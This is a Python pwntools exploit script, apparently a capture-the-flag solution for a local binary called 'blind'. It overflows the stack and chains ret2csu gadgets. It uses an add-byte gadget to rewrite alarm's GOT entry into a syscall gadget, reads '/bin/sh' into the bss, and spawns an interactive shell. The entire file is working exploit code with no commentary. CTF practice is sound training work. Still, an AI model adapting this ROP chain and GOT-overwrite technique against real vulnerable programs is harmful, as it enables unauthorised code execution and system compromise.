#coding:utf8 
from pwn import *

context.arch = "amd64"
context.log_level = "debug"

sh = process("./blind")

bss = 0x601060
"""0x0000000000400698 : add byte ptr [rbp + 5], dh ; jmp 0x400630"""
add_rbp_dh = 0x400698 
pop_rbp = 0x0000000000400620
pop_rdi = 0x00000000004007c3
pop_rsi = 0x00000000004007c1

csu_pop = 0x4007BA
csu_call = 0x4007A0
alarm_got = 0x601018
read_got = 0x601020
read_plt = 0x400570

# attach(sh,'b *0x400753')
payload = 'a'*0x58 + p64(csu_pop)
payload += p64(0) + p64(1)
payload += p64(alarm_got)
payload += p64(0x9<<0x8)#0x5 << 0x8)
payload += p64(0) + p64(0x1000)
payload += p64(csu_call)
payload += p64(0)*2
payload += p64(alarm_got - 0x5)#rbp
payload += p64(0)*4
payload += p64(add_rbp_dh)

payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(bss)
payload += p64(0)
payload += p64(read_plt)

payload += p64(csu_pop)
payload += p64(0) + p64(1)
payload += p64(alarm_got)
payload += p64(0) + p64(0) + p64(bss)
payload += p64(csu_call)

sh.send(payload)
pause()
sleep(3)
sh.send('/bin/sh'.ljust(0x3b,'\x00'))
sh.interactive()